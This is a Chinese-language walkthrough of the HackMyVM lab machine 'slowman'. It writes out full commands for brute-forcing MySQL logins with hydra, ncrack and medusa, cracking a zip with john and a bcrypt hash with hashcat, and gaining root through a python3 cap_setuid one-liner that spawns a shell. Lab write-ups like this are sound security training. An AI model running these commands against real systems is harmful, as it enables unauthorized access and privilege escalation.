---
title: slowman
tags:
  - sec
date: 2024-02-15T15:44:24
lastmod: 2025-09-29T20:52:11
toc: "true"
---
## 端口扫描
网络环境问题,还是得 nmap 的全端口扫描

![HMM_slowman_image_1](https://img.l1uyun.one/HMM_slowman_image_1.png)

## ftp 匿名登录

![HMM_slowman_image_2](https://img.l1uyun.one/HMM_slowman_image_2.png)

## 爆破 mysql 密码
trainerjeff
接下来得看 mysql 了
hydra 好慢
换了 ncrack 试试
```bash
sudo ncrack -T5 -v -u trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://192.168.10.8
sudo  medusa -h 192.168.10.8 -u trainerjeff -P /usr/share/wordlists/rockyou.txt -M mysql
sudo hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt 192.168.10.8 mysql
```
没出来, 吐了, 每分钟八次. 太慢了. 看 wp 算了
假装枚举出来了
![HMM_slowman_image_3](https://img.l1uyun.one/HMM_slowman_image_3.png)
## 枚举 mysql 信息
```bash
sudo mysql -h 192.168.10.8 -u trainerjeff -psoccer1
```
![HMM_slowman_image_4](https://img.l1uyun.one/HMM_slowman_image_4.png)
```bash
|  1 | gonzalo     tH1sS2stH3g0nz4l0pAsSWW0rDD!! 
|  2 | $SECRETLOGINURL /secretLOGIN/login.html  
```
![HMM_slowman_image_5](https://img.l1uyun.one/HMM_slowman_image_5.png)
## web 枚举
![HMM_slowman_image_6](https://img.l1uyun.one/HMM_slowman_image_6.png)
进入之前 mysql 中发现的隐藏目录, 使用发现的用户名密码登录, 后面发现这个也能登录 ssh
![HMM_slowman_image_7](https://img.l1uyun.one/HMM_slowman_image_7.png)
进去之后有个压缩包, 有密码
使用 john
![HMM_slowman_image_8](https://img.l1uyun.one/HMM_slowman_image_8.png)
解压之后是一个账号和密码, 猜测是 ssh 的
```bash
----------
$USERS: trainerjean

$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq 
---------- 

```
使用 hashcat 解密一下
```bash
hashcat -m 3200 -a 0 hhh /usr/share/wordlists/rockyou.txt
  
$2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq:tweety1
```

## USER_trainerjean
![HMM_slowman_image_9](https://img.l1uyun.one/HMM_slowman_image_9.png)
在 trainjean 的目录下面发现了这个 python 代码,
```bash
trainerjean@slowman:~$ cat .python_history
import os
os.system('bash')
os.system('0')
os.setid('0')
os.setuid('0')
exit
```
## USER_root
尝试提权
上传 linpeas 和 pspy64, 后者没有发现什么
![HMM_slowman_image_10](https://img.l1uyun.one/HMM_slowman_image_10.png)
没有注意 Capabilities 文件的信息.. 错过了
使用命令查找 Capabilities 文件
```bash
getcap -r / 2>/dev/null

/usr/bin/python3.10 cap_setuid=ep

/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
![HMM_slowman_image_11](https://img.l1uyun.one/HMM_slowman_image_11.png)
